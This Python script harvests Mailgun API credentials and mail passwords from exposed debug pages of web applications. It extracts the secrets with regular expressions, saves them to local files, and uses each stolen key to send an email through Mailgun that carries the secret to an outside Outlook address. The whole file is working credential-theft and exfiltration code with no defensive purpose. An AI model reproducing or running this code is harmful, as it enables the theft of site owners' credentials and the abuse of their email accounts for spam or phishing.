import requests, os, sys, codecs
from re import findall as reg
def extract_domain_or_return_as_is(line):
    # Regular expression pattern to find the domain preceded by "@"
    domain_pattern = r'@([\w.-]+)'

    # Check if the line contains "@" using regex search
    match = re.search(domain_pattern, line)

    if match:
        # If "@" is found, extract and return the domain
        domain = match.group(1)
        return domain
    else:
        # If "@" is not found, return the line as it is
        return line
def ExploitS(all1,url):
    try:
        if "mailgun" in all1:
            try:
                open ('./MAILGUN_URL.txt', 'a').write (url+'\n') 
                
                MAILGUN_DOMAIN = reg('<td>MAILGUN_DOMAIN<\/td>\s+<td><pre.*>(.*?)<\/span>', all1)[0]
         
    
                MAILGUN_SECRET = reg('<td>MAILGUN_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>', all1)[0]
                url = "https://api.mailgun.net/v3/"+MAILGUN_DOMAIN+"/messages"
                auth = ('api', MAILGUN_SECRET)
                open ('PS_MAILGUN.txt', 'a').write (MAILGUN_DOMAIN + '|'+MAILGUN_SECRET +'\n')
               

                payload = {
                     "from": "test@"+MAILGUN_DOMAIN,
                     "to": "gnixy.tn@outlook.com",
                     "subject": MAILGUN_DOMAIN,
                     "html": MAILGUN_DOMAIN+' '+MAILGUN_SECRET
                }

    

                response = requests.post(url, auth=auth, data=payload)

                print(response.text)

                
                if "Queued." in response.text:
                    print("Email sent successfully!")
                    open ('MAILGUN.txt', 'a').write (url+ '\n'+'MAILGUN_DOMAIN : '+MAILGUN_DOMAIN + '\n'+'MAILGUN_SECRET : '+MAILGUN_SECRET + '\n' )
        
                else:
                    print("Email Sail!")
                 
                    
                
            except:
                
                pass
            try:
               
                
                MAILGUN_DOMAIN = reg('<td>MAILGUN_DOMAIN<\/td>\s+<td><pre.*>(.*?)<\/span>', all1)[0]
               
                MAILGUN_SECRET = reg('<td>MAILGUN_TOKEN<\/td>\s+<td><pre.*>(.*?)<\/span>', all1)[0]
                url = "https://api.mailgun.net/v3/"+MAILGUN_DOMAIN+"/messages"
                auth = ('api', MAILGUN_SECRET)
                open ('PS_MAILGUN.txt', 'a').write (MAILGUN_DOMAIN + '|'+MAILGUN_SECRET +'\n')
               

                payload = {
                     "from": "test@"+MAILGUN_DOMAIN,
                     "to": "gnixy.tn@outlook.com",
                     "subject": MAILGUN_DOMAIN,
                     "html": MAILGUN_DOMAIN+' '+MAILGUN_SECRET
                }

    

                response = requests.post(url, auth=auth, data=payload)

                print(response.text)

                
                if "Queued." in response.text:
                    print("Email sent successfully!")
                    open ('MAILGUN.txt', 'a').write (url+ '\n'+'MAILGUN_DOMAIN : '+MAILGUN_DOMAIN + '\n'+'MAILGUN_SECRET : '+MAILGUN_SECRET + '\n' )
        
                else:
                    print("Email Sail!")
            
                    
                
            except:
                
                pass
            try:
               
                
                MAILGUN_DOMAIN = reg('<td>MAILGUN_URL<\/td>\s+<td><pre.*>(.*?)<\/span>', all1)[0]
               
                MAILGUN_SECRET = reg('<td>MAILGUN_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', all1)[0]
                url = "https://api.mailgun.net/v3/"+MAILGUN_DOMAIN+"/messages"
                auth = ('api', MAILGUN_SECRET)
                open ('PS_MAILGUN.txt', 'a').write (MAILGUN_DOMAIN + '|'+MAILGUN_SECRET  +'\n')
               

                payload = {
                     "from": "test@"+MAILGUN_DOMAIN,
                     "to": "gnixy.tn@outlook.com",
                     "subject": MAILGUN_DOMAIN,
                     "html": MAILGUN_DOMAIN+' '+MAILGUN_SECRET
                }

    

                response = requests.post(url, auth=auth, data=payload)

                print(response.text)

                
                if "Queued." in response.text:
                    print("Email sent successfully!")
                    open ('MAILGUN.txt', 'a').write (url+ '\n'+'MAILGUN_DOMAIN : '+MAILGUN_DOMAIN + '\n'+'MAILGUN_SECRET : '+MAILGUN_SECRET + '\n' )
        
                else:
                    print("Email Sail!")
   
                    
                
            except:
                
                pass
            try:
                
                
                MAILGUN_DOMAIN = reg('<td>MAILGUN_DOMAIN<\/td>\s+<td><pre.*>(.*?)<\/span>', all1)[0]
                
                MAILGUN_SECRET = reg('<td>MAILGUN_API_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', all1)[0]
                url = "https://api.mailgun.net/v3/"+MAILGUN_DOMAIN+"/messages"
                auth = ('api', MAILGUN_SECRET)
                open ('PS_MAILGUN.txt', 'a').write (MAILGUN_DOMAIN + '|'+MAILGUN_SECRET +'\n')
               

                payload = {
                     "from": "test@"+MAILGUN_DOMAIN,
                     "to": "gnixy.tn@outlook.com",
                     "subject": MAILGUN_DOMAIN,
                     "html": MAILGUN_DOMAIN+' '+MAILGUN_SECRET
                }

    

                response = requests.post(url, auth=auth, data=payload)

                print(response.text)

                
                if "Queued." in response.text:
                    print("Email sent successfully!")
                    open ('MAILGUN.txt', 'a').write (url+ '\n'+'MAILGUN_DOMAIN : '+MAILGUN_DOMAIN + '\n'+'MAILGUN_SECRET : '+MAILGUN_SECRET + '\n' )
        
                else:
                    print("Email Sail!")
                    
                    
                
            except:
                
                pass
            try:
                
                
                MAILGUN_DOMAIN = reg('<td>MAIL_USERNAME<\/td>\s+<td><pre.*>(.*?)<\/span>', all1)[0]
                
                MAILGUN_SECRET = reg('<td>MAIL_PASSWORD<\/td>\s+<td><pre.*>(.*?)<\/span>', all1)[0]
                url = "https://api.mailgun.net/v3/"+MAILGUN_DOMAIN.split('@')[1]+"/messages"
                open ('PS_MAILGUN.txt', 'a').write (MAILGUN_DOMAIN + '|'+MAILGUN_SECRET  +'\n')
                auth = ('api', MAILGUN_SECRET)
               

                payload = {
                     "from": "test@"+MAILGUN_DOMAIN.split('@')[1],
                     "to": "gnixy.tn@outlook.com",
                     "subject": MAILGUN_DOMAIN.split('@')[1],
                     "html": MAILGUN_DOMAIN.split('@')[1]+' '+MAILGUN_SECRET
                }

    

                response = requests.post(url, auth=auth, data=payload)

                print(response.text)

                
                if "Queued." in response.text:
                    print("Email sent successfully!")
                    open ('MAILGUN.txt', 'a').write (url+ '\n'+'MAILGUN_DOMAIN : '+MAILGUN_DOMAIN + '\n'+'MAILGUN_SECRET : '+MAILGUN_SECRET + '\n' )
        
                else:
                    print("Email Sail!")
                                   
            except:
                
                pass
            try:
               
                
                MAILGUN_DOMAIN = reg('<td>MAILGUN_MAIL_DOMAIN<\/td>\s+<td><pre.*>(.*?)<\/span>', all1)[0]
                
                MAILGUN_SECRET = reg('<td>MAILGUN_MAIL_PASSWORD<\/td>\s+<td><pre.*>(.*?)<\/span>', all1)[0]
                url = "https://api.mailgun.net/v3/"+MAILGUN_DOMAIN+"/messages"
                open ('PS_MAILGUN.txt', 'a').write (MAILGUN_DOMAIN + '|'+MAILGUN_SECRET +'\n')
                auth = ('api', MAILGUN_SECRET)
               

                payload = {
                     "from": "test@"+MAILGUN_DOMAIN,
                     "to": "gnixy.tn@outlook.com",
                     "subject": MAILGUN_DOMAIN,
                     "html": MAILGUN_DOMAIN+' '+MAILGUN_SECRET
                }

    

                response = requests.post(url, auth=auth, data=payload)

                print(response.text)

                
                if "Queued." in response.text:
                    print("Email sent successfully!")
                    open ('MAILGUN.txt', 'a').write (url+ '\n'+'MAILGUN_DOMAIN : '+MAILGUN_DOMAIN + '\n'+'MAILGUN_SECRET : '+MAILGUN_SECRET + '\n' )
        
                else:
                    print("Email Sail!")
                   
                    
                
            except:
                
                pass                               
    except:
        
        pass
